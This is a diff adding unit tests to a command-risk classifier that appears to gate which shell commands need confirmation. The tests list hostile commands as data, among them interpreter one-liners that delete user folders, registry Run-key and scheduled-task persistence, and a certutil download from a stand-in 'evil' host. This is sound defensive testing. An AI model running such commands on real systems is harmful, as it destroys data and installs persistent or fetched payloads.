@@ -119,6 +119,42 @@ class CommandRiskClassifierTests(unittest.TestCase):
         self._assert_safe("git stash show")
         self._assert_safe("git fetch origin")
 
+    def test_interpreter_inline_eval_is_code_execution(self):
+        # The classic injection sink: arbitrary code with no file on disk.
+        self._assert_risky(
+            'python -c "import shutil; shutil.rmtree(\'C:/Users\')"',
+            mentions=command_risk.CODE_EXECUTION,
+        )
+        self._assert_risky("node -e 'require(\"fs\").rmSync(\"x\")'", mentions=command_risk.CODE_EXECUTION)
+        self._assert_risky("perl -e 'unlink glob q(*)'", mentions=command_risk.CODE_EXECUTION)
+        self._assert_risky("ruby -e 'File.delete(\"x\")'", mentions=command_risk.CODE_EXECUTION)
+        self._assert_risky("php -r 'unlink(\"x\");'", mentions=command_risk.CODE_EXECUTION)
+        self._assert_risky("powershell -Command 'Remove-Item x'", mentions=command_risk.CODE_EXECUTION)
+
+    def test_running_named_script_file_stays_ungated(self):
+        # Build/test flows must not stop for confirmation.
+        self._assert_safe("python -m pytest -q")
+        self._assert_safe("python manage.py check")
+        self._assert_safe("node build.js")
+
+    def test_direct_executable_invocation_requires_confirmation(self):
+        self._assert_risky(".\\malware.exe", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("./setup.exe", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("C:\\Temp\\payload.bat", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("evil.vbs", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("wscript evil.vbs", mentions=command_risk.PROCESS_SPAWN)
+
+    def test_windows_persistence_tools_require_confirmation(self):
+        self._assert_risky("reg add HKCU\\Run /v x /d calc", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("schtasks /create /tn t /tr calc /sc onlogon", mentions=command_risk.PROCESS_SPAWN)
+        self._assert_risky("certutil -urlcache -f http://evil/x x.exe", mentions=command_risk.PROCESS_SPAWN)
+
+    def test_find_destructive_forms_require_confirmation(self):
+        self._assert_risky("find . -name '*.py' -delete", mentions=command_risk.DELETE)
+        self._assert_risky("find . -exec rm {} ;", mentions=command_risk.PROCESS_SPAWN)
+        # Read-only find stays safe.
+        self._assert_safe("find . -name '*.py'")
+
     # ---- safe read-only -------------------------------------------------
 
     def test_low_risk_read_only(self):
